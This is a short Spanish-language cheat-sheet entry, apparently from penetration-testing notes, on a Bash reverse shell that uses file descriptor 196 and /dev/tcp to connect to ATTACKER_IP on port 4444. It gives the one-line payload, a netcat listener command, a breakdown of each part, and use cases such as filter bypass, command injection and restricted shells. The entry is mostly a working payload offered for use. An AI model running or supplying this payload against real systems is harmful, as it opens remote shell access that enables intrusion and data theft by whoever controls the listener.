# Bash Reverse Shell — File Descriptor

## Descripción

Esta variante utiliza **file descriptors de Bash** para abrir una conexión TCP hacia el atacante y redirigir la entrada y salida de la shell.

Es útil cuando otras variantes fallan o están filtradas.

---

# Comando

```bash
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444; sh <&196 >&196 2>&196
```

---

# Listener

```bash
nc -lvnp 4444
```

---

# Requisitos

* Bash
* soporte de `/dev/tcp`

---

# Explicación

```
196                → descriptor de archivo
exec               → abre conexión TCP
/dev/tcp           → conexión TCP
sh                 → ejecuta shell
<&196 >&196        → redirección de entrada y salida
2>&196             → redirige errores
```

---

# Cuándo usarlo

* bypass de filtros
* command injection
* shells restringidas

---

# Limitaciones

* difícil de memorizar
* puede ser detectado por IDS
